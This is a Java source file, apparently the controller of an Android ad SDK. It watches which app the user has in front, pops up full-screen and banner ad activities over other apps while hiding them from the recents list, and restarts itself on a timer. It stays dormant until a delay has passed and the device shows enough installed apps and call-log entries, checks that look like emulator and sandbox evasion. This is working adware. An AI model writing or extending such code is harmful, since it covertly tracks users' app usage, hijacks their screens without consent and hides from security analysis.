package com.guang.gad;

import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

/**
 * Created by guang on 2017/8/14.
 */

public class GController {
    private static GController _instance;
    private Context context;
    private Sdk sdk;
    private Handler handler;
    private int MSG_MAINLOOP = 1;
    private int MSG_RESTART = 2;
    private String launcherApps = "";
    private String extApps = "";
    private GReceiver receiver;
    private boolean isPresent;
    private boolean isRuning;

    private GController(){}

    public static GController getInstance()
    {
        if(_instance == null)
            _instance = new GController();
        return _instance;
    }

    public void init(Context context)
    {
        this.context = context;
        this.isRuning = false;
        parseSdk();
    }

    public Context getContext()
    {
        return context;
    }

    private void killpro()
    {
        android.os.Process.killProcess(android.os.Process.myPid());
    }

    private void parseSdk()
    {
        handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);

                if(msg.what == MSG_MAINLOOP)
                {
                    mainLoop();
                }
                else if(msg.what == MSG_RESTART)
                {
                    killpro();
                }
            }
        };

        long timeLimt = Common.getPre().getLong("timeLimt",0l);
        if(timeLimt == 0l)
            Common.getPre().edit().putLong("timeLimt",System.currentTimeMillis()).commit();


        String sdks = Common.getPre().getString(Common.PRE_SDK,"");
        try {
            JSONObject obj = new JSONObject(sdks);

            sdk = new Sdk();
            sdk.setPackageName(obj.getString("packageName"));
            sdk.setVersionName(obj.getString("versionName"));
            sdk.setVersionCode(obj.getString("versionCode"));
            sdk.setDownloadPath(obj.getString("downloadPath"));
            sdk.setOnline(obj.getBoolean("online"));
            sdk.setUpdateNum(obj.getLong("updateNum"));
            sdk.setChannel(obj.getString("channel"));
            sdk.setNetTypes(obj.getString("netTypes"));
            sdk.setName(obj.getString("name"));
            sdk.setAppPackageName(obj.getString("appPackageName"));
            sdk.setAdPosition(obj.getString("adPosition"));
            sdk.setLoopTime((float)obj.getDouble("loopTime"));
            sdk.setCallLogNum(obj.getInt("callLogNum"));
            sdk.setTimeLimt((float)obj.getDouble("timeLimt"));
            sdk.setAppNum(obj.getInt("appNum"));
            sdk.setShowNum(obj.getInt("showNum"));
            sdk.setBlackList(obj.getString("blackList"));
            sdk.setShowTimeInterval((float)obj.getDouble("showTimeInterval"));

            readSdk();

        } catch (JSONException e) {
            e.printStackTrace();

        }
    }

    private void readSdk()
    {
        boolean b = true;

        long now = System.currentTimeMillis();
        long timeLimt = Common.getPre().getLong("timeLimt",0l);
        if(now - timeLimt < sdk.getTimeLimt()*24*60*60*1000)
        {
            b = false;
            Log.e("--------","timeLimt limit");
        }

        if(b && Common.getApps().size() < sdk.getAppNum())
        {
            b = false;
            Log.e("--------","AppNum limit");
        }

        if(b && Common.getCallLogNum() < sdk.getCallLogNum())
        {
            b = false;
            Log.e("--------","CallLogNum limit");
        }

        if(b)
        {
            initMainLoop();
            mainLoop();
        }
        else
        {
            handler.sendEmptyMessageDelayed(MSG_RESTART,(long)(sdk.getLoopTime()*60*60*1000l));
        }
    }

    private void initMainLoop()
    {
        launcherApps = Common.getLauncherApps().toString();
        extApps = Common.getExtApps().toString();
        Log.e("-------","launcherApps="+launcherApps);
        Log.e("-------","extApps="+extApps);
        long now = System.currentTimeMillis();
        Common.getPre().edit().putLong("maintime",now).commit();

        if(receiver != null)
        {
            context.unregisterReceiver(receiver);
            receiver = null;
        }
        receiver = new GReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);
        filter.addAction(Intent.ACTION_POWER_CONNECTED);
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
        context.registerReceiver(receiver, filter);

        this.isRuning = true;
        this.isPresent = true;

        //大于一天初始化
        long appTime = Common.getPre().getLong("apptime",0l);
        if(now - appTime > 20*60*60*1000)
        {
            Common.getPre().edit().putLong("apptime",now).commit();
            Common.getPre().edit().putInt("spot_shownum",0).commit();
            Common.getPre().edit().putInt("banner_shownum",0).commit();
        }
    }

    private void mainLoop()
    {
        long now = System.currentTimeMillis();
        long maintime = Common.getPre().getLong("maintime",0l);

        if(now - maintime < (long)(sdk.getLoopTime()*60*60*1000l))
        {
            long time = 1000;
            if(isPresent)
            {
                File f = Common.getStorageFile("g_log");
                String topPackageName =  Common.readFile(f);

                if(!topPackageName.equals(GController.getInstance().getContext().getPackageName()))
                    saveCurrPackageName(topPackageName);
                if(sdk.getBlackList() != null && !sdk.getBlackList().contains(topPackageName)
                        && (extApps.contains(topPackageName) || launcherApps.contains(topPackageName))
                        && !topPackageName.equals(GController.getInstance().getContext().getPackageName()))
                {
                    if(isLauncherToApp(topPackageName))
                    {
                        time = 10*1000;
                        spot(topPackageName);
                        banner(topPackageName);
                        Log.e("-------","isLauncherToApp="+topPackageName);
                    }

                    if(isAppToApp(topPackageName))
                    {
                        time = 10*1000;
                        Log.e("-------","isAppToApp="+topPackageName);
                    }
                }
                saveTopPackageName(topPackageName);
            }
            handler.sendEmptyMessageDelayed(MSG_MAINLOOP,time);
        }
        else
        {
            handler.sendEmptyMessageDelayed(MSG_RESTART,0);
        }
    }

    private boolean isLauncherToApp(String topPackageName)
    {
        boolean isLauncher = Common.getPre().getBoolean("isLauncher",false);
        String lastApp = Common.getPre().getString("lastApp","");
        Common.getPre().edit().putBoolean("isLauncher",launcherApps.contains(topPackageName)).commit();
        if(isLauncher && !launcherApps.contains(topPackageName) && !lastApp.equals(topPackageName))
            return true;
        return false;
    }

    private boolean isAppToApp(String topPackageName)
    {
        String lastApp = Common.getPre().getString("lastApp","");
        if(!lastApp.equals(topPackageName) && !launcherApps.contains(topPackageName)
                && !launcherApps.contains(lastApp) )
            return true;

        return false;
    }

    private void saveCurrPackageName(String topPackageName)
    {
        Common.getPre().edit().putString("currApp",topPackageName).commit();
    }

    private void saveTopPackageName(String topPackageName)
    {
        String lastApp = Common.getPre().getString("lastApp","");
//        String currApp = Common.getPre().getString("currApp","");

        Common.getPre().edit().putString("lastApp",topPackageName).commit();
//        Common.getPre().edit().putString("currApp",topPackageName).commit();
    }

    private void spot(String packageName)
    {
        if(     isNet()
                && sdk.getAdPosition() != null
                && sdk.getAdPosition().contains("spot")
                && isShowNum("spot")
                && isShowTimeInterval("spot"))
        {
            long now = System.currentTimeMillis();
            Common.getPre().edit().putLong("spot_showtime",now).commit();

            Intent intent = new Intent(context, SpotActivity.class);
            intent.putExtra("appName",packageName);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            context.startActivity(intent);
        }
    }

    private void banner(final String packageName)
    {
        if(     isNet()
                && sdk.getAdPosition() != null
                && sdk.getAdPosition().contains("banner")
                && isShowNum("banner")
                && isShowTimeInterval("banner"))
        {
            long now = System.currentTimeMillis();
            Common.getPre().edit().putLong("banner_showtime",now).commit();

            new Thread(){
                @Override
                public void run() {
                    super.run();
                    try {
                        Thread.sleep(60*1000);
                        Intent intent = new Intent(context, BannerActivity.class);
                        intent.putExtra("appName",packageName);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                        context.startActivity(intent);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
    }


    private boolean isNet()
    {
        return !Common.getNetworkType().equals("");
    }

    private boolean isShowNum(String type)
    {
        if("spot".equals(type))
        {
            int num = Common.getPre().getInt("spot_shownum",0);
            return num < sdk.getShowNum();
        }
        else if("banner".equals(type))
        {
            int num = Common.getPre().getInt("banner_shownum",0);
            return num < sdk.getShowNum();
        }
        return false;
    }

    private boolean isShowTimeInterval(String type)
    {
        long now = System.currentTimeMillis();
        if("spot".equals(type))
        {
            long time = Common.getPre().getLong("spot_showtime",0l);
            return now - time > sdk.getShowTimeInterval()*60*60*1000;
        }
        else if("banner".equals(type))
        {
            long time = Common.getPre().getLong("banner_showtime",0l);
            return now - time > sdk.getShowTimeInterval()*60*60*1000;
        }
        return false;
    }

    public boolean isPresent() {
        return isPresent;
    }

    public void setPresent(boolean present) {
        isPresent = present;
    }

    public boolean isRuning() {
        return isRuning;
    }

    public void setRuning(boolean runing) {
        isRuning = runing;
    }
}
